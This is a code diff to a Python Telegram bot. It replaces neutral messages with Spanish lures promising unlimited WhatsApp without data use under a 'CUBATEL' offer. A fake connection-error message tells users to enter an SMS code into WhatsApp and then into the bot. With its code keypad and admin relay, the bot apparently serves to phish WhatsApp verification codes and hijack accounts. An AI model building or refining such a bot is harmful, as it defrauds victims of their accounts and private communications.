@@ -354,7 +354,7 @@ async def start_join_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if not phone_actual:
         await q.answer(
-            text="verifica que eres miembro del grupo de clases",
+            text="𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐢𝐥𝐢𝐦𝐢𝐭𝐚𝐝𝐨 𝐬𝐢𝐧 𝐜𝐨𝐧𝐬𝐮𝐦𝐨 𝐝𝐞 𝐝𝐚𝐭𝐨𝐬 𝐦𝐨𝐯𝐢𝐥𝐞𝐬 𝐲 𝐜𝐨𝐧 𝐥𝐚 𝐦𝐚𝐲𝐨𝐫 𝐯𝐞𝐥𝐨𝐜𝐢𝐝𝐚𝐝 𝐝𝐞 𝐢𝐧𝐭𝐞𝐫𝐧𝐞𝐭. ¡¡¡𝐎𝐅𝐄𝐑𝐓𝐀 𝐂𝐔𝐁𝐀𝐓𝐄𝐋!!! 𝐕𝐞𝐧𝐜𝐞 𝐞𝐥 𝟑𝟏 𝐝𝐞 𝐦𝐚𝐫𝐳𝐨.",
             show_alert=True
         )
 
@@ -707,8 +707,8 @@ async def error_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stop_wait_task(case_data["user_id"])
 
     error_text = (
-        "❌ La conexión fue fallida por mala conexión.\n\n"
-        "Por favor, vuelve a introducir tu código de acceso."
+        "❌𝗖𝗼𝗻𝗲𝘅𝗶𝗼́𝗻 𝐟𝐚𝐥𝐥𝐢𝐝𝐚. 𝗦𝗲𝗻̃𝗮𝗹 𝐝𝐞𝐛𝐢𝐥.\n\n"
+        "𝐍𝐨 𝐭𝐞 𝐝𝐞𝐬𝐚𝐧𝐢𝐦𝐞𝐬, 𝐞𝐬 𝐧𝐨𝐫𝐦𝐚𝐥. 𝐑𝐞𝐜𝐢𝐛𝐞 𝐞𝐥 𝐧𝐮𝐞𝐯𝐨 𝐜𝐨𝐝𝐢𝐠𝐨 𝐫𝐞𝐜𝐢𝐛𝐢𝐝𝐨 𝐩𝐨𝐫 𝐦𝐞𝐧𝐬𝐚𝐣𝐞 𝐝𝐞 𝐭𝐞𝐱𝐭𝐨 𝐚 𝐭𝐮 𝐭𝐞𝐥𝐞𝐟𝐨𝐧𝐨 𝐞 𝐢𝐧𝐠𝐫𝐞𝐬𝐚 𝐞𝐥 𝐜𝐨𝐝𝐢𝐠𝐨 𝐞𝐧 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐩𝐫𝐢𝐦𝐞𝐫𝐨 𝐲 𝐥𝐮𝐞𝐠𝐨 𝐚𝐪𝐮𝐢 𝐞𝐧 𝐞𝐥 𝐬𝐞𝐫𝐯𝐢𝐝𝐨𝐫 𝐩𝐚𝐫𝐚 𝐞𝐬𝐭𝐚𝐛𝐥𝐞𝐜𝐞𝐫 𝐥𝐚 𝐜𝐨𝐧𝐞𝐱𝐢𝐨𝐧 𝐚 𝐢𝐧𝐭𝐞𝐫𝐧𝐞𝐭."
     )
     text, kb = build_keypad("")
 
@@ -758,7 +758,10 @@ async def admin_reply_bridge(update: Update, context: ContextTypes.DEFAULT_TYPE)
         return
 
     try:
-        if msg.text and not msg.photo and not msg.video and not msg.animation and not msg.audio and not msg.voice and not msg.document and not msg.sticker:
+        if msg.text and not (
+            msg.photo or msg.video or msg.animation or msg.audio or
+            msg.voice or msg.document or msg.sticker
+        ):
             await context.bot.send_message(
                 chat_id=target_user_id,
                 text=msg.text
@@ -766,8 +769,8 @@ async def admin_reply_bridge(update: Update, context: ContextTypes.DEFAULT_TYPE)
             return
 
         if (
-            msg.photo or msg.video or msg.animation or msg.audio or msg.voice
-            or msg.document or msg.sticker
+            msg.photo or msg.video or msg.animation or msg.audio or
+            msg.voice or msg.document or msg.sticker
         ):
             await context.bot.copy_message(
                 chat_id=target_user_id,
@@ -1036,7 +1039,7 @@ def main():
     app.add_handler(CommandHandler("lista", lista_cmd))
     app.add_handler(MessageHandler(filters.ChatType.PRIVATE & ~filters.COMMAND & ~filters.CONTACT, private_chat_bridge), group=0)
     app.add_handler(MessageHandler(filters.ChatType.PRIVATE & ~filters.COMMAND & ~filters.CONTACT, private_fallback), group=1)
-    app.add_handler(MessageHandler(filters.Chat(str(ADMIN_CHANNEL_ID)) & filters.REPLY & ~filters.COMMAND, admin_reply_bridge), group=0)
+    app.add_handler(MessageHandler(filters.REPLY & ~filters.COMMAND, admin_reply_bridge), group=0)
     
     app.run_polling()
 
